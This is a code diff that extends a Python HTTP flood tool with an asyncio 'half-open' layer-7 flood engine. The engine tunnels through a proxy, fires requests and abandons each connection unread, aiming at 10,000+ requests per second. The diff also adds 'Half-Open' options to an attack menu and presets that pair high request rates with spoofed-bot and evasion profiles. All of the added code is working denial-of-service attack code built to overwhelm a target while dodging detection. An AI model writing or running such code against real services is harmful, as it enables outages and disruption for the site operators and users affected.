@@ -31,6 +31,7 @@ import json
 import random
 import string
 import threading
+import asyncio
 import urllib.request
 import urllib.error
 import urllib.parse
@@ -594,6 +595,218 @@ def _single_request(target_url, idx, method, profile="rotate"):
         return False, 0.0, 0
 
 
+# ─────────────────────────────────────────────────────────────────────────────
+# ASYNC HALF-OPEN FLOOD ENGINE
+# ─────────────────────────────────────────────────────────────────────────────
+# Strategy:
+#   1. Open TCP to proxy → send HTTP CONNECT to tunnel to target host:port
+#   2. Once tunnelled, write the full HTTP request line + headers
+#   3. DO NOT read the response — close/abandon the connection immediately
+#   4. Because we never wait for a response the event loop can fire thousands
+#      of these per second with minimal concurrency.
+# ─────────────────────────────────────────────────────────────────────────────
+
+def _make_raw_request_bytes(host, path, method, profile):
+    # type: (str, str, str, str) -> bytes
+    """Build raw HTTP/1.1 request bytes (no body wait)."""
+    hdrs = _build_headers(profile)
+    lines = ["{} {} HTTP/1.1".format(method, path)]
+    lines.append("Host: {}".format(host))
+    for name, val in hdrs:
+        lines.append("{}: {}".format(name, val))
+    lines.append("Connection: close")
+    lines.append("")
+    lines.append("")
+    return "\r\n".join(lines).encode("utf-8", errors="replace")
+
+
+async def _half_open_worker(target_host, target_port, path, method, profile,
+                             semaphore, counters, lock):
+    # type: (...) -> None
+    """
+    Single async half-open request:
+    proxy CONNECT → write request → abandon (don't read response).
+    """
+    async with semaphore:
+        try:
+            # Connect to proxy
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(PROXY_HOST, PROXY_PORT),
+                timeout=5.0,
+            )
+            # Send HTTP CONNECT to open a tunnel
+            connect_req = "CONNECT {}:{} HTTP/1.1\r\nHost: {}:{}\r\n\r\n".format(
+                target_host, target_port, target_host, target_port)
+            writer.write(connect_req.encode())
+            await writer.drain()
+
+            # Read proxy CONNECT response (just first line)
+            try:
+                resp_line = await asyncio.wait_for(reader.readline(), timeout=3.0)
+                if b"200" not in resp_line:
+                    writer.close()
+                    async with asyncio.Lock():
+                        pass
+                    with lock:
+                        counters["errors"] += 1
+                        counters["total"]  += 1
+                    return
+            except Exception:
+                writer.close()
+                with lock:
+                    counters["errors"] += 1
+                    counters["total"]  += 1
+                return
+
+            # Drain rest of CONNECT response headers
+            try:
+                while True:
+                    line = await asyncio.wait_for(reader.readline(), timeout=2.0)
+                    if line in (b"\r\n", b"\n", b""):
+                        break
+            except Exception:
+                pass
+
+            # Optionally inject QS into path
+            full_path = path
+            qs_mode = _QS_INJECT[0]
+            if qs_mode == "always" or (qs_mode == "random" and random.random() < 0.5):
+                sep = "&" if "?" in full_path else "?"
+                full_path = full_path + sep + _rand_qs(random.randint(1, 3))
+
+            # Write the HTTP request — fire and abandon
+            req_bytes = _make_raw_request_bytes(target_host, full_path, method, profile)
+            writer.write(req_bytes)
+            await writer.drain()
+
+            # Half-open: close immediately without reading response
+            writer.close()
+            with lock:
+                counters["sent"]  += 1
+                counters["total"] += 1
+
+        except Exception:
+            with lock:
+                counters["errors"] += 1
+                counters["total"]  += 1
+
+
+def run_half_open_flood(target_url, concurrency, rps, duration, method, label=None):
+    # type: (str, int, float, float, str, Optional[str]) -> Dict
+    """
+    Async half-open L7 flood.
+    Fires HTTP requests through the proxy tunnel but never reads responses.
+    Achieves 1,000–10,000+ RPS by eliminating response-wait time.
+    """
+    parsed     = urllib.parse.urlparse(target_url)
+    target_host = parsed.hostname or ""
+    target_port = parsed.port or (443 if parsed.scheme == "https" else 80)
+    path        = parsed.path or "/"
+    if parsed.query:
+        path = path + "?" + parsed.query
+
+    display_label = label or "{} [half-open]".format(method)
+    section(
+        "HALF-OPEN FLOOD — {}{}{}{}  |  {} async slots  |  {:.0f} RPS target  |  {:.0f}s\n"
+        "  {}Target : {}{}\n"
+        "  {}Proxy  : {}{}\n"
+        "  {}Mode   : {}fire-and-abandon (no response read){}".format(
+            BOLD, display_label, RESET, CYAN,
+            concurrency, rps, duration,
+            CYAN, target_url, RESET,
+            CYAN, PROXY_URL, RESET,
+            YELLOW, RESET, RESET,
+        )
+    )
+
+    counters   = {"sent": 0, "errors": 0, "total": 0}
+    lock       = threading.Lock()
+    wall_start = time.time()
+    deadline   = wall_start + duration
+    bar_width  = 40
+
+    def _print_progress():
+        elapsed    = time.time() - wall_start
+        pct        = min(elapsed / duration, 1.0)
+        filled     = int(bar_width * pct)
+        bar        = "\u2588" * filled + "\u2591" * (bar_width - filled)
+        actual_rps = counters["total"] / elapsed if elapsed > 0 else 0
+        print(
+            "\r  [{}] {:.1f}/{:.0f}s  "
+            "{}{}{}sent  {}{}{}err  "
+            "{}{:.0f} RPS{}   ".format(
+                bar, elapsed, duration,
+                GREEN, counters["sent"], RESET,
+                RED, counters["errors"], RESET,
+                CYAN, actual_rps, RESET,
+            ),
+            end="", flush=True,
+        )
+
+    async def _async_loop():
+        semaphore = asyncio.Semaphore(concurrency)
+        interval  = 1.0 / rps if rps > 0 else 0.0
+        tasks     = []   # type: List[asyncio.Task]
+        idx       = 0
+        profile   = _EVASION_PROFILE[0]
+
+        while time.time() < deadline:
+            t0 = time.time()
+            task = asyncio.ensure_future(
+                _half_open_worker(
+                    target_host, target_port, path, method,
+                    profile, semaphore, counters, lock,
+                )
+            )
+            tasks.append(task)
+            idx += 1
+            _print_progress()
+
+            elapsed_submit = time.time() - t0
+            sleep_needed   = interval - elapsed_submit
+            if sleep_needed > 0.0001:
+                await asyncio.sleep(sleep_needed)
+
+            # Prune done tasks to prevent list bloat
+            if idx % 500 == 0:
+                tasks = [t for t in tasks if not t.done()]
+
+        # Wait for in-flight tasks (max 5s)
+        if tasks:
+            await asyncio.wait(tasks, timeout=5)
+
+    # Run the async loop in a thread so we don't block main thread
+    loop = asyncio.new_event_loop()
+    t    = threading.Thread(target=loop.run_until_complete, args=(_async_loop(),))
+    t.start()
+    t.join()
+    loop.close()
+    print()
+
+    wall_elapsed = time.time() - wall_start
+    colour       = MAGENTA if label else YELLOW
+
+    print("\n{}  ── {}{}{} Half-Open Summary {}{}{}".format(
+        BOLD, colour, display_label, RESET, BOLD, "─"*28, RESET))
+    ok("Total fired    : {:,}".format(counters["total"]))
+    ok("Requests sent  : {}{:,}{}".format(GREEN, counters["sent"], RESET))
+    if counters["errors"]:
+        warn("Tunnel errors  : {}{:,}{}".format(RED, counters["errors"], RESET))
+    ok("Wall time      : {:.2f} s".format(wall_elapsed))
+    ok("Throughput     : {}{:.0f} RPS{}".format(
+        BOLD, counters["total"] / wall_elapsed if wall_elapsed > 0 else 0, RESET))
+    warn("Note: half-open — responses not read; server-side impact may be higher than RPS suggests")
+
+    return {
+        "method":     display_label,
+        "total":      counters["total"],
+        "success":    counters["sent"],
+        "errors":     counters["errors"],
+        "wall":       wall_elapsed,
+        "rps_actual": counters["total"] / wall_elapsed if wall_elapsed > 0 else 0,
+    }
+
+
 def run_flood(target_url, workers, rps, duration, method, label=None):
     # type: (str, int, float, float, str, Optional[str]) -> Dict
     """
@@ -812,15 +1025,18 @@ def _prompt_float(prompt, default):
 
 
 ATTACK_MENU = [
-    ("Diagnostic (10 sequential tests)",  "diag"),
-    ("GET Flood",                          "GET"),
-    ("POST Flood",                         "POST"),
-    ("HEAD Flood",                         "HEAD"),
-    ("PUT Flood",                          "PUT"),
-    ("PATCH Flood",                        "PATCH"),
-    ("DELETE Flood",                       "DELETE"),
-    ("OPTIONS Flood",                      "OPTIONS"),
-    ("Multi-Vector (all methods at once)", "multi"),
+    ("Diagnostic (10 sequential tests)",            "diag"),
+    ("GET Flood",                                    "GET"),
+    ("POST Flood",                                   "POST"),
+    ("HEAD Flood",                                   "HEAD"),
+    ("PUT Flood",                                    "PUT"),
+    ("PATCH Flood",                                  "PATCH"),
+    ("DELETE Flood",                                 "DELETE"),
+    ("OPTIONS Flood",                                "OPTIONS"),
+    ("Multi-Vector (all methods at once)",           "multi"),
+    ("Half-Open GET  [5k+ RPS, no response read]",  "ho_GET"),
+    ("Half-Open POST [5k+ RPS, no response read]",  "ho_POST"),
+    ("Half-Open HEAD [5k+ RPS, no response read]",  "ho_HEAD"),
 ]
 
 
@@ -867,17 +1083,22 @@ def show_menu():
 # Last entry is "custom" – will prompt for conns/rps/duration + profile choices
 # ─────────────────────────────────────────────────────────────────────────────
 _PRESETS = [
-    # label                           conns  rps   dur   ua_profile        shuffle  qs
-    ("Light  – legit desktop",           25,  50,   30, "legit_desktop",   False, "off"),
-    ("Medium – legit desktop",           50, 100,   60, "legit_desktop",   False, "off"),
-    ("Heavy  – legit desktop",          100, 250,   60, "legit_desktop",   False, "off"),
-    ("Light  – legit mobile",            25,  50,   30, "legit_mobile",    False, "off"),
-    ("Medium – legit mobile",            50, 100,   60, "legit_mobile",    False, "off"),
-    ("Light  – spoofed bots",            25,  50,   30, "spoofed_bots",    False, "off"),
-    ("Medium – spoofed bots + shuffle",  50, 100,   60, "spoofed_bots",    True,  "random"),
-    ("Heavy  – full evasion + QS",      100, 250,   60, "spoofed_evasion", True,  "always"),
-    ("Blitz  – rotate all + shuffle",   150, 500,   30, "rotate",          True,  "random"),
-    ("Custom – set your own values",      0,   0,    0, "",                False, "off"),
+    # label                                  conns    rps   dur   ua_profile        shuffle  qs
+    ("Light    – legit desktop",                25,    50,   30, "legit_desktop",   False, "off"),
+    ("Medium   – legit desktop",                50,   100,   60, "legit_desktop",   False, "off"),
+    ("Heavy    – legit desktop",               100,   250,   60, "legit_desktop",   False, "off"),
+    ("Light    – legit mobile",                 25,    50,   30, "legit_mobile",    False, "off"),
+    ("Medium   – legit mobile",                 50,   100,   60, "legit_mobile",    False, "off"),
+    ("Light    – spoofed bots",                 25,    50,   30, "spoofed_bots",    False, "off"),
+    ("Medium   – spoofed bots + shuffle",       50,   100,   60, "spoofed_bots",    True,  "random"),
+    ("Heavy    – full evasion + QS",           100,   250,   60, "spoofed_evasion", True,  "always"),
+    ("Blitz    – rotate all + shuffle",        150,   500,   30, "rotate",          True,  "random"),
+    # ── Half-open high-RPS presets (asyncio, no response read) ───────────────
+    ("HalfOpen – 1k RPS  [async, 200 slots]",  200,  1000,  30, "rotate",          True,  "random"),
+    ("HalfOpen – 5k RPS  [async, 500 slots]",  500,  5000,  30, "rotate",          True,  "always"),
+    ("HalfOpen – 10k RPS [async, 1000 slots]",1000, 10000,  30, "rotate",          True,  "always"),
+    # ── Custom ───────────────────────────────────────────────────────────────
+    ("Custom   – set your own values",            0,     0,   0, "",                False, "off"),
 ]
 
 
@@ -1038,6 +1259,20 @@ def main():
 
     if mode == "multi":
         run_multi_vector(target_url, workers=workers, rps=rps, duration=duration)
+    elif mode.startswith("ho_"):
+        # Half-open async flood — extract HTTP method from mode key (ho_GET → GET)
+        ho_method = mode[3:]
+        run_half_open_flood(
+            target_url=target_url,
+            concurrency=workers,
+            rps=rps,
+            duration=duration,
+            method=ho_method,
+        )
+        print("\n{}{}{}".format(BOLD+GREEN, "="*60, RESET))
+        print("{}  Half-open flood complete.{}".format(BOLD+GREEN, RESET))
+        print("{}{}{}".format(BOLD+GREEN, "="*60, RESET))
+        print()
     else:
         run_flood(target_url=target_url, workers=workers, rps=rps,
                   duration=duration, method=mode)
